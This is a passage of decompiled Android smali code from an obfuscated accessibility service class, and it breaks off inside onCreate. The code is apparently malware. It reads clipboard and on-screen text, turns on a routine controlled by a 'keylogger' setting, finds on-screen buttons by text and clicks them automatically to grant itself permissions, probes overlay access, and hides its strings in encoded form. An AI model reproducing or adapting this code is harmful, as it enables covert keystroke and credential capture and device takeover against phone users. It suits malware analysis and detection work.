    sget-object p2, Lb0/b;->a:Lb0/b;

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :goto_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    goto :goto_1

    :cond_0
    sget-object p2, Lb0/b;->a:Lb0/b;

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_1
    :goto_1
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 19

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    const-string v3, "dWpQMzRQMUJNZ0FBYUdibWdSMkdqUT09OjpEekZPejMvNUlKTHpIdzRFZk1mM2FnPT0="

    const-string v4, "eUVDanJhYnF4N0NmN2pBM2NyWnpxZ0FDY2cxSFRWTk5iV1VFeDJGUFJuUT06Olh6Q3ZMR2N3aGVpZXlJVWhVNXZURlE9PQ=="

    const-string v5, "applicationContext"

    if-nez v2, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object v0, Ls0/c;->e:Landroid/content/Context;

    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    const/4 v7, 0x0

    if-nez v6, :cond_1

    const-string v6, "settings"

    invoke-virtual {v0, v6, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_6

    .line 2
    :cond_1
    :try_start_1
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    :try_start_2
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v0

    .line 3
    :goto_0
    instance-of v6, v0, Lj0/d$a;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_6

    const-string v8, ""

    if-eqz v6, :cond_2

    move-object v0, v8

    .line 4
    :cond_2
    :try_start_3
    check-cast v0, Ljava/lang/String;

    iput-object v0, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_6

    :try_start_4
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v0

    :try_start_5
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v0

    .line 5
    :goto_1
    instance-of v6, v0, Lj0/d$a;

    if-eqz v6, :cond_3

    move-object v0, v8

    .line 6
    :cond_3
    check-cast v0, Ljava/lang/String;

    iput-object v0, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_6

    :try_start_6
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v6, 0x10

    if-ne v0, v6, :cond_5

    const-string v0, "clipboard"

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    if-eqz v0, :cond_4

    move-object v6, v0

    check-cast v6, Landroid/content/ClipboardManager;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    const-string v9, "event.text"

    invoke-static {v0, v9}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :goto_2
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/CharSequence;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0
    .catchall {:try_start_6 .. :try_end_6} :catchall_6

    :try_start_7
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v6, v0, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->G(Landroid/content/ClipboardManager;Ljava/lang/String;Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_2

    goto :goto_2

    :catchall_2
    move-exception v0

    :try_start_8
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    goto :goto_2

    :cond_4
    new-instance v0, Ljava/lang/NullPointerException;

    const-string v6, "null cannot be cast to non-null type android.content.ClipboardManager"

    invoke-direct {v0, v6}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v0

    :cond_5
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0
    .catchall {:try_start_8 .. :try_end_8} :catchall_6

    goto :goto_4

    :catch_0
    :try_start_9
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_3

    goto :goto_3

    :catchall_3
    move-exception v0

    :try_start_a
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v0

    .line 7
    :goto_3
    instance-of v6, v0, Lj0/d$a;

    if-eqz v6, :cond_6

    move-object v0, v8

    .line 8
    :cond_6
    check-cast v0, Ljava/lang/String;

    :goto_4
    iput-object v0, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 9
    sget-boolean v0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->g:Z

    const/16 v6, 0x40

    const/16 v9, 0x20

    if-eqz v0, :cond_7

    .line 10
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-eq v0, v6, :cond_7

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v0, v9, :cond_2a

    invoke-virtual {v1, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->K(Z)Z

    iget-object v0, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-virtual {v1, v0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h(Ljava/lang/String;)Z

    return-void

    .line 11
    :cond_7
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v10, "keylogger"

    invoke-interface {v0, v10, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_8

    move-object v0, v8

    .line 12
    :cond_8
    const-string v10, "1"

    invoke-static {v0, v10}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    invoke-virtual/range {p0 .. p1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->C(Landroid/view/accessibility/AccessibilityEvent;)V

    :cond_9
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/4 v10, 0x2

    const/4 v11, 0x0

    const/4 v12, 0x1

    if-ne v0, v10, :cond_e

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->y()Z

    move-result v0

    if-eqz v0, :cond_a

    return-void

    :cond_a
    sget-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r:Z
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_6

    if-eqz v0, :cond_2a

    :try_start_b
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    if-nez v0, :cond_b

    move-object v0, v11

    goto :goto_5

    :cond_b
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_5
    invoke-static {}, Ls0/c;->k()Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5, v12}, Ly0/f;->L(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_d

    iget-object v0, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-static {}, Ls0/c;->k()Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5, v12}, Ly0/f;->L(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_d

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    if-nez v0, :cond_c

    goto :goto_6

    :cond_c
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v11
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_4

    :goto_6
    const/16 v0, 0x80

    .line 13
    :try_start_c
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v5

    invoke-virtual {v2, v5}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v2

    check-cast v2, Ljava/lang/String;
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_1
    .catchall {:try_start_c .. :try_end_c} :catchall_4

    goto :goto_7

    :catch_1
    :try_start_d
    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 14
    sget-object v2, Lb0/b;->a:Lb0/b;

    move-object v2, v8

    .line 15
    :goto_7
    invoke-static {v11, v2, v12}, Ly0/f;->L(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_d

    iget-object v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_4

    .line 16
    :try_start_e
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    invoke-virtual {v5, v0}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_2
    .catchall {:try_start_e .. :try_end_e} :catchall_4

    move-object v8, v0

    goto :goto_8

    :catch_2
    :try_start_f
    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 17
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 18
    :goto_8
    invoke-static {v2, v8, v12}, Ly0/f;->L(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_2a

    :cond_d
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->a()V
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_4

    return-void

    :catchall_4
    move-exception v0

    :try_start_10
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    goto/16 :goto_12

    :cond_e
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-eq v0, v9, :cond_10

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v3, 0x800

    if-ne v0, v3, :cond_f

    goto :goto_9

    :cond_f
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v0, v6, :cond_2a

    invoke-virtual/range {p0 .. p1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->F(Landroid/view/accessibility/AccessibilityEvent;)V

    goto/16 :goto_12

    :cond_10
    :goto_9
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->E()V

    sget-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r:Z

    if-nez v0, :cond_12

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->u()Z

    move-result v0

    if-eqz v0, :cond_11

    return-void

    :cond_11
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->b()Z

    move-result v0
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_6

    if-eqz v0, :cond_1f

    return-void

    .line 19
    :cond_12
    :try_start_11
    sget-object v0, Lb0/b;->G:Lj0/b;

    check-cast v0, Lj0/e;

    invoke-virtual {v0}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Set;

    .line 20
    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_a
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_18

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_13

    goto :goto_a

    :cond_13
    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_14

    goto :goto_a

    :cond_14
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_15
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_16

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    move-object v6, v4

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-eqz v6, :cond_15

    goto :goto_b

    :cond_16
    move-object v4, v11

    :goto_b
    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_17

    goto :goto_a

    :cond_17
    invoke-virtual {v1, v4, v12}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_5

    goto :goto_c

    :catchall_5
    move-exception v0

    :try_start_12
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_18
    :goto_c
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->y()Z

    move-result v0

    if-eqz v0, :cond_19

    return-void

    :cond_19
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->M()V

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->x()V

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->D()Z

    move-result v0

    if-eqz v0, :cond_1a

    return-void

    :cond_1a
    invoke-virtual/range {p0 .. p1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->I(Landroid/view/accessibility/AccessibilityEvent;)V

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->k()V

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->L()Z

    move-result v0

    if-eqz v0, :cond_1b

    return-void

    :cond_1b
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->i()V

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    iget-object v3, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    invoke-virtual {v1, v0, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->t(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->H()Z

    move-result v0

    if-eqz v0, :cond_1c

    return-void

    :cond_1c
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->m()V

    iget-object v0, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-virtual {v1, v0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1d

    return-void

    :cond_1d
    invoke-virtual/range {p0 .. p1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->w(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v0

    if-eqz v0, :cond_1e

    return-void

    .line 21
    :cond_1e
    invoke-virtual {v1, v12}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->K(Z)Z

    .line 22
    :cond_1f
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v9, v0, :cond_2a

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e()Z

    move-result v0

    if-eqz v0, :cond_20

    return-void

    :cond_20
    sget-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r:Z

    if-nez v0, :cond_2a

    const-string v0, "xiaomi"

    iget-object v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    invoke-static {v0, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_6

    const-string v2, "Q2YvLzIxSDN0eDB6VDNYR01xdmtuZz09OjptSFpkc2pQdEpnY2NIZ2p3SWsrTkpBPT0="

    if-eqz v0, :cond_23

    :try_start_13
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0}, Lb0/a;->k(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2a

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0}, Lb0/a;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2a

    .line 23
    sget-object v0, Lb0/b;->a:Lb0/b;

    invoke-virtual {v0}, Lb0/b;->g()Ljava/util/ArrayList;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    move v3, v12

    :cond_21
    :goto_d
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_22

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {v1, v4}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v4

    if-eqz v4, :cond_21

    move v3, v7

    goto :goto_d

    :cond_22
    if-eqz v3, :cond_2a

    .line 24
    const-string v0, "1"

    .line 25
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v3, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 26
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "autoClickPerm2"

    invoke-interface {v0, v2, v8}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto/16 :goto_11

    .line 27
    :cond_23
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 28
    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_24

    goto :goto_e

    :cond_24
    const-string v3, "appops"

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/AppOpsManager;
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_6

    if-eqz v3, :cond_25

    :try_start_14
    const-string v4, "android:system_alert_window"

    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v5

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v4, v5, v6}, Landroid/app/AppOpsManager;->checkOp(Ljava/lang/String;ILjava/lang/String;)I

    move-result v0
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_3
    .catchall {:try_start_14 .. :try_end_14} :catchall_6

    if-nez v0, :cond_27

    goto :goto_e

    :catch_3
    :cond_25
    :try_start_15
    const-string v3, "window"

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    if-eqz v3, :cond_26

    check-cast v3, Landroid/view/WindowManager;

    new-instance v4, Landroid/view/View;

    invoke-direct {v4, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v14, 0x0

    const/4 v15, 0x0

    const/16 v16, 0x7f6

    const/16 v17, 0x18

    const/16 v18, -0x2

    move-object v13, v0

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    invoke-virtual {v4, v0}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v3, v4, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v3, v4}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :goto_e
    move v0, v12

    goto :goto_f

    :cond_26
    new-instance v0, Ljava/lang/NullPointerException;

    const-string v3, "null cannot be cast to non-null type android.view.WindowManager"

    invoke-direct {v0, v3}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v0
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_4
    .catchall {:try_start_15 .. :try_end_15} :catchall_6

    :catch_4
    :cond_27
    move v0, v7

    :goto_f
    if-eqz v0, :cond_2a

    .line 29
    :try_start_16
    sget-object v0, Lb0/b;->a:Lb0/b;

    invoke-virtual {v0}, Lb0/b;->g()Ljava/util/ArrayList;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    move v3, v12

    :cond_28
    :goto_10
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_29

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {v1, v4}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v4

    if-eqz v4, :cond_28

    move v3, v7

    goto :goto_10

    :cond_29
    if-eqz v3, :cond_2a

    .line 30
    const-string v0, "1"

    .line 31
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v3, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 32
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "autoClickPerm"

    invoke-interface {v0, v2, v8}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 33
    :goto_11
    sput-boolean v12, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r:Z
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_6

    goto :goto_12

    :catchall_6
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_2a
    :goto_12
    return-void
.end method

.method public onCreate()V
    .locals 3

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onCreate()V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "this.applicationContext"

